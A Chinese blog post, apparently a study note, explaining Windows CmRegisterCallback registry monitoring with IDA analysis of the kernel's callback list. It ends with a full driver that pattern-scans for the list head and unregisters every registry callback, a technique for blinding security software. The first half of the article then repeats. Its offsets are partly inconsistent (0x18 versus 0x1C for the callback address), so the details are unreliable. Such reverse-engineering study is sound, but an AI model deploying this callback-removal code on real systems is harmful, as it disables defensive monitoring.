                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">知识点补充学习</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="CmRegisterCallback"><a href="#CmRegisterCallback" class="headerlink" title="CmRegisterCallback"></a>CmRegisterCallback</h3><p>64位系统下微软提供了<code>CmRegisterCallback</code>这个回调函数来实时监控注册表的操作，那详细探究一下其实现的原理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">CmRegisterCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PEX_CALLBACK_FUNCTION Function,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PVOID                 Context,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PLARGE_INTEGER        Cookie</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>上面为其结构，详细参数如下：            </p>
<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Function</td>
<td>指向RegistryCallback例程的指针，这个参数就是用来监控注册表操作的回调函数</td>
</tr>
<tr>
<td>Context</td>
<td>配置管理器将作为CallbackContext参数传递给RegistryCallback例程中由驱动程序定义的值。此处设为NULL就好</td>
</tr>
<tr>
<td>Cookie</td>
<td>指向LARGE_INTEGER变量的指针，该变量接收标识回调例程的值。当注册回调例程的时候，次值将作为Cookie参数传递给CmUnRegisterCallback</td>
</tr>
</tbody></table>
<p>其中第一个参数指向的类型是<code>PEX_CALLBACK_FUNCTION</code>，该类型是一个回调函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">EX_CALLBACK_FUNCTION ExCallbackFunction;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">ExCallbackFunction</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PVOID CallbackContext,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PVOID Argument1,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PVOID Argument2</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>参数如下</p>
<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>CallbackContext</td>
<td>在注册该RegistryCallback例程时，驱动程序作为Context参数传递给CmRegisterCallback的值</td>
</tr>
<tr>
<td>Argument1</td>
<td>REG_NOTIFY_CLASS联合体类型的值，用于标识正在执行的注册表的操作类型，以及是否在执行注册表操作之前或之后调用RegistryCallback例程</td>
</tr>
<tr>
<td>Argument2</td>
<td>指向特定于注册表操作信息的结构指针。结构的类型取决于Argument1中的REG_NOTIFY_CLASS类型值</td>
</tr>
</tbody></table>
<p><code>REG_NOTIFY_CLASS</code>结构中其中的几个比较常用的类型，它们的意义，以及对应的<code>Argument2</code>的结构体的内容如下</p>
<table>
<thead>
<tr>
<th><strong>REG_NOTIFY_CLASS的值</strong></th>
<th><strong>意义</strong></th>
<th><strong>Argument2结构体</strong></th>
</tr>
</thead>
<tbody><tr>
<td>RegNtPreCreateKey</td>
<td>创建注册表</td>
<td>PREG_CREATE_KEY_INFORMATION</td>
</tr>
<tr>
<td>RegNtPreOpenKey</td>
<td>打开注册表</td>
<td>PREG_CREATE_KEY_INFORMATION</td>
</tr>
<tr>
<td>RegNtPreDeleteKey</td>
<td>删除键</td>
<td>PREG_DELETE_KEY_INFORMATION</td>
</tr>
<tr>
<td>RegNtPreDeleteValueKey</td>
<td>删除键值</td>
<td>PREG_DELETE_VALUE_KEY_INFORMATION</td>
</tr>
<tr>
<td>RegNtPreSetValueKey</td>
<td>修改键值</td>
<td>PREG_SET_VALUE_KEY_INFORMATION</td>
</tr>
</tbody></table>
<p>关注一下这几个结构体，其中<code>PREG_CREATE_KEY_INFORMATION</code>就是有两个关键成员</p>
<table>
<thead>
<tr>
<th><strong>成员</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>CompleteName</td>
<td>指向包含新注册表项路径的UNICODE_字符串结构的指针。路径可以是绝对的，也可以是相对的。如果路径是绝对路径，则此结构包含以“\”字符开头的完全限定路径。对于绝对路径，RootObject成员指定\注册表项，它是注册表树的根目录。如果路径是相对的，则路径以“\”以外的字符开头，并且与RootObject成员指定的键相对</td>
</tr>
<tr>
<td>RootObject</td>
<td>指向注册表项对象的指针，该对象用作CompleteName成员指定的路径的根</td>
</tr>
</tbody></table>
<p>然后关于<code>PREG_DELETE_KEY_INFORMATION</code>的结构体定义如下，<code>Object</code>参数指向要删除注册表的指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">REG_DELETE_KEY_INFORMATION</span> &#123;</span></span><br><span class="line">    PVOID    Object;                      <span class="comment">// IN</span></span><br><span class="line">    PVOID    CallContext;  </span><br><span class="line">    PVOID    ObjectContext;</span><br><span class="line">    PVOID    Reserved;     </span><br><span class="line">&#125; REG_DELETE_KEY_INFORMATION, *PREG_DELETE_KEY_INFORMATION</span><br></pre></td></tr></table></figure>

<p>然后<code>PREG_DELETE_VALUE_KEY_INFORMATION</code>结构体定义如下,<code>Object</code>还是指向要删除的注册表的指针，而<code>ValueName</code>就是指向具体需要删除的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">REG_DELETE_VALUE_KEY_INFORMATION</span> &#123;</span></span><br><span class="line">  PVOID           Object;</span><br><span class="line">  PUNICODE_STRING ValueName;</span><br><span class="line">  PVOID           CallContext;</span><br><span class="line">  PVOID           ObjectContext;</span><br><span class="line">  PVOID           Reserved;</span><br><span class="line">&#125; REG_DELETE_VALUE_KEY_INFORMATION, *PREG_DELETE_VALUE_KEY_INFORMATION;</span><br></pre></td></tr></table></figure>

<p>最后是<code>PREG_SET_VALUE_KEY_INFORMATION</code>结构，同样是<code>Object</code>指向要修改的注册表的指针，而<code>ValueName</code>就是指向具体需要修改的值。</p>
<h3 id="IDA逆向分析"><a href="#IDA逆向分析" class="headerlink" title="IDA逆向分析"></a>IDA逆向分析</h3><p>这个函数首先将需要的参数入栈以后调用<code>CmpRegisterCallbackInternal</code></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220630164456292.png" alt="image-20220630164456292"></p>
<p>通过<code>test esi,esi</code>将<code>Blink</code>和<code>Flink</code>都指向自己，然后进行判断后跳转到<code>69436B</code>这个地址</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220630164913636.png" alt="image-20220630164913636"></p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220630165633538.png" alt="image-20220630165633538"></p>
<p>这段函数的主要作用就是将<code>Cookie</code>的值存入<code>0x10</code>偏移处，这里的设计很巧妙，因为一个cookie是占8位的，这里首先将<code>[esi + 0x10]</code>的值存入eax，然后将 ebx 指向的内存位置的内容移动到指向 eax 的内存位置，相当于赋值前4位，然后再进行同样的操作，这里取的是<code>[esi + 0x14]</code>，也就是赋值后四位。</p>
<p><img src="C:\Users\16434\AppData\Roaming\Typora\typora-user-images\image-20220630171826957.png" alt="image-20220630171826957"></p>
<p>可以看到，系统分配0x30大小的内存来保存相应的内容，根据以上的分析可以得出下面的结论</p>
<ul>
<li>最开始的8个字节保存的是一个<code>LIST_ENTRY</code>类型的双向链表</li>
<li>偏移0x10保存的是COOKIE</li>
<li>偏移0x1C保存的Context</li>
<li>偏移0x18保存的是回调函数的地址</li>
</ul>
<p>可以想到注册表监控的回调函数是用<code>LIST_ENTRY</code>双向链表来一个个连起来的。而真正将分配的这块内存加入链表的函数则是<code>SetRegisterCallback</code>函数</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220630173058237.png" alt="image-20220630173058237"></p>
<p>在这个<code>ListBegin</code>就是链表头的地址，里面保存的就是第一个链表的地址。首先会将它保存的内容取出判断保存的是否就是<code>ListBegin</code>的首地址，如果是的话就说明到了链表的尾部，接下来就会跳转到<code>loc_695306</code>来把结构加进链表。如果不是的话，它会执行循环，不断的取链表中的下一个数据直到链表尾。</p>
<p>​           ——————————————-我是一条分割线—————————————————————</p>
<p>根据上面的内容知道了，回调函数是可以获取要操作的注册表键的对象的，所以可以使用<code>ObQueryNameString</code>函数来<strong>获得要操作的键的名称</strong>，该函数在文档中的定义如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">  <span class="title">ObQueryNameString</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN PVOID  Object,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT POBJECT_NAME_INFORMATION  ObjectNameInfo,</span></span></span><br><span class="line"><span class="params"><span class="function">    IN ULONG  Length,</span></span></span><br><span class="line"><span class="params"><span class="function">    OUT PULONG  ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Object</td>
<td>指向请求名称的对象的指针。此参数是必需的，不能为NULL。</td>
</tr>
<tr>
<td>ObjectNameInfo</td>
<td>指向接收对象名称信息的调用方分配的缓冲区的OBJECT_NAME_INFORMATION指针</td>
</tr>
<tr>
<td>Length</td>
<td>参数二的缓冲区大小</td>
</tr>
<tr>
<td>ReturnLength</td>
<td>实际返回到缓冲区中的数据大小</td>
</tr>
</tbody></table>
<p><strong>想要实现对监控函数的删除，</strong>可以使用<code>CmUnRegisterCallback</code>函数来实现，该函数在文档中的定义如下。它只有一个参数，就是前面设置监控函数时候指定的<code>Cookie</code>的地址。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">  <span class="title">CmUnRegisterCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    IN LARGE_INTEGER  Cookie)</span></span>;</span><br></pre></td></tr></table></figure>

<h3 id="实施监控"><a href="#实施监控" class="headerlink" title="实施监控"></a>实施监控</h3><p>注册表的监控回调函数被以链表的形式保存到了内存中，其中这个链表头是ListBegin。接下来只要找到这个链表头并且遍历这个链表，取出COOKIE就可以实现回调函数的删除。通过字节码匹配可以找到链表头。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(IN PDRIVER_OBJECT driverObject)</span></span>;</span><br><span class="line"><span class="function">PULONG <span class="title">GetRegisterList</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function">NTSTATUS <span class="title">DriverEntry</span><span class="params">(IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING registryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    NTSTATUS status = STATUS_SUCCESS;</span><br><span class="line">    PULONG pHead = <span class="literal">NULL</span>;</span><br><span class="line">    PLIST_ENTRY pListEntry = <span class="literal">NULL</span>;</span><br><span class="line">    PLARGE_INTEGER  pLiRegCookie = <span class="literal">NULL</span>;</span><br><span class="line">    LARGE_INTEGER test;</span><br><span class="line">    PULONG pFuncAddr = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">    DbgPrint(<span class="string">&quot;驱动加载完成\r\n&quot;</span>);</span><br><span class="line">    pHead = GetRegisterList();</span><br><span class="line">    <span class="keyword">if</span> (pHead != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        pListEntry = (PLIST_ENTRY)*pHead;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">while</span> ((ULONG)pListEntry != (ULONG)pHead)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!MmIsAddressValid(pListEntry)) <span class="keyword">break</span>;</span><br><span class="line">             </span><br><span class="line">            pLiRegCookie = (PLARGE_INTEGER)((ULONG)pListEntry + <span class="number">0x10</span>);</span><br><span class="line">            pFuncAddr = (PULONG)((ULONG)pListEntry + <span class="number">0x1C</span>);</span><br><span class="line">            <span class="comment">//判断地址是否有效</span></span><br><span class="line">            <span class="keyword">if</span> (MmIsAddressValid(pFuncAddr) &amp;&amp;  MmIsAddressValid(pLiRegCookie))</span><br><span class="line">            &#123;</span><br><span class="line">                status = CmUnRegisterCallback(*pLiRegCookie);</span><br><span class="line">                <span class="keyword">if</span> (NT_SUCCESS(status))</span><br><span class="line">                &#123;</span><br><span class="line">                    DbgPrint(<span class="string">&quot;删除注册表回调成功,函数地址为0x%X\r\n&quot;</span>, *pFuncAddr);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            pListEntry = pListEntry-&gt;Flink;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="built_in">exit</span>:</span><br><span class="line">    driverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function">PULONG <span class="title">GetRegisterList</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PULONG pListEntry = <span class="literal">NULL</span>;</span><br><span class="line">    PUCHAR pCmRegFunc = <span class="literal">NULL</span>, pCmcRegFunc = <span class="literal">NULL</span>, pSetRegFunc = <span class="literal">NULL</span>;</span><br><span class="line">    UNICODE_STRING uStrFuncName = RTL_CONSTANT_STRING(<span class="string">L&quot;CmRegisterCallback&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    pCmRegFunc = (PUCHAR)MmGetSystemRoutineAddress(&amp;uStrFuncName);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (pCmRegFunc == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;MmGetSystemRoutineAddress Error\r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">while</span> (*pCmRegFunc != <span class="number">0xC2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*pCmRegFunc == <span class="number">0xE8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pCmcRegFunc = (PUCHAR)((ULONG)pCmRegFunc + <span class="number">5</span> + *(PULONG)(pCmRegFunc + <span class="number">1</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pCmRegFunc++;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (pCmcRegFunc == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;GetCmcRegFunc Error\r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (*pCmcRegFunc != <span class="number">0xC2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*pCmcRegFunc == <span class="number">0x8B</span> &amp;&amp; *(pCmcRegFunc +<span class="number">1</span>) == <span class="number">0xC6</span> &amp;&amp; *(pCmcRegFunc + <span class="number">2</span>) == <span class="number">0xE8</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pSetRegFunc = (PUCHAR)((ULONG)pCmcRegFunc + <span class="number">2</span> + <span class="number">5</span> + *(PULONG)(pCmcRegFunc + <span class="number">3</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pCmcRegFunc++;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (pSetRegFunc == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DbgPrint(<span class="string">&quot;GetSetRegFunc Error\r\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> <span class="built_in">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span> (*pSetRegFunc != <span class="number">0xC2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (*pSetRegFunc == <span class="number">0xBB</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            pListEntry = (PULONG)*(PULONG)(pSetRegFunc + <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        pSetRegFunc++;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="built_in">exit</span>:</span><br><span class="line">    <span class="keyword">return</span> pListEntry;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function">VOID <span class="title">DriverUnload</span><span class="params">(IN PDRIVER_OBJECT driverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DbgPrint(<span class="string">&quot;驱动卸载完成\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-269980.htm#msg_header_h1_0">看雪</a>、<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/mefFuWKJMDJMYvNTjzBVuw">跳跳糖</a></p>
<p>(<strong>PS</strong>:前面虽然说是64位，但是我发现参考的文章其实IDA分析的都是32位的ntoskrnl.exe)</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/06/30/Cheese_point/%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9B%91%E6%8E%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
      <meta itemprop="name" content="ZouFeIYu">
      <meta itemprop="description" content="reading, coding, travelling">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hazel'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/06/30/Cheese_point/%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9B%91%E6%8E%A7/" class="post-title-link" itemprop="url">注册表监控</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-06-30 00:00:00" itemprop="dateCreated datePublished" datetime="2022-06-30T00:00:00+08:00">2022-06-30</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-07-18 15:26:10" itemprop="dateModified" datetime="2022-07-18T15:26:10+08:00">2022-07-18</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%9F%A5%E8%AF%86%E7%82%B9%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">知识点补充学习</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>5.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>5 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h3 id="CmRegisterCallback"><a href="#CmRegisterCallback" class="headerlink" title="CmRegisterCallback"></a>CmRegisterCallback</h3><p>64位系统下微软提供了<code>CmRegisterCallback</code>这个回调函数来实时监控注册表的操作，那详细探究一下其实现的原理。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">CmRegisterCallback</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PEX_CALLBACK_FUNCTION Function,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PVOID                 Context,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PLARGE_INTEGER        Cookie</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>上面为其结构，详细参数如下：            </p>
<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Function</td>
<td>指向RegistryCallback例程的指针，这个参数就是用来监控注册表操作的回调函数</td>
</tr>
<tr>
<td>Context</td>
<td>配置管理器将作为CallbackContext参数传递给RegistryCallback例程中由驱动程序定义的值。此处设为NULL就好</td>
</tr>
<tr>
<td>Cookie</td>
<td>指向LARGE_INTEGER变量的指针，该变量接收标识回调例程的值。当注册回调例程的时候，次值将作为Cookie参数传递给CmUnRegisterCallback</td>
</tr>
</tbody></table>
<p>其中第一个参数指向的类型是<code>PEX_CALLBACK_FUNCTION</code>，该类型是一个回调函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">EX_CALLBACK_FUNCTION ExCallbackFunction;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">ExCallbackFunction</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PVOID CallbackContext,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PVOID Argument1,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PVOID Argument2</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;...&#125;</span><br></pre></td></tr></table></figure>

<p>参数如下</p>
<table>
<thead>
<tr>
<th><strong>参数</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>CallbackContext</td>
<td>在注册该RegistryCallback例程时，驱动程序作为Context参数传递给CmRegisterCallback的值</td>
</tr>
<tr>
<td>Argument1</td>
<td>REG_NOTIFY_CLASS联合体类型的值，用于标识正在执行的注册表的操作类型，以及是否在执行注册表操作之前或之后调用RegistryCallback例程</td>
</tr>
<tr>
<td>Argument2</td>
<td>指向特定于注册表操作信息的结构指针。结构的类型取决于Argument1中的REG_NOTIFY_CLASS类型值</td>
</tr>
</tbody></table>
<p><code>REG_NOTIFY_CLASS</code>结构中其中的几个比较常用的类型，它们的意义，以及对应的<code>Argument2</code>的结构体的内容如下</p>
<table>
<thead>
<tr>
<th><strong>REG_NOTIFY_CLASS的值</strong></th>
<th><strong>意义</strong></th>
<th><strong>Argument2结构体</strong></th>
</tr>
</thead>
<tbody><tr>
<td>RegNtPreCreateKey</td>
<td>创建注册表</td>
<td>PREG_CREATE_KEY_INFORMATION</td>
</tr>
<tr>
<td>RegNtPreOpenKey</td>
<td>打开注册表</td>
<td>PREG_CREATE_KEY_INFORMATION</td>
</tr>
<tr>
<td>RegNtPreDeleteKey</td>
<td>删除键</td>
<td>PREG_DELETE_KEY_INFORMATION</td>
</tr>
<tr>
<td>RegNtPreDeleteValueKey</td>
<td>删除键值</td>
<td>PREG_DELETE_VALUE_KEY_INFORMATION</td>
</tr>
<tr>
<td>RegNtPreSetValueKey</td>
<td>修改键值</td>
<td>PREG_SET_VALUE_KEY_INFORMATION</td>
</tr>
</tbody></table>
<p>关注一下这几个结构体，其中<code>PREG_CREATE_KEY_INFORMATION</code>就是有两个关键成员</p>
<table>
<thead>
<tr>
<th><strong>成员</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>CompleteName</td>
<td>指向包含新注册表项路径的UNICODE_字符串结构的指针。路径可以是绝对的，也可以是相对的。如果路径是绝对路径，则此结构包含以“\”字符开头的完全限定路径。对于绝对路径，RootObject成员指定\注册表项，它是注册表树的根目录。如果路径是相对的，则路径以“\”以外的字符开头，并且与RootObject成员指定的键相对</td>
</tr>
<tr>
<td>RootObject</td>
<td>指向注册表项对象的指针，该对象用作CompleteName成员指定的路径的根</td>
</tr>
</tbody></table>
<p>然后关于<code>PREG_DELETE_KEY_INFORMATION</code>的结构体定义如下，<code>Object</code>参数指向要删除注册表的指针</p>
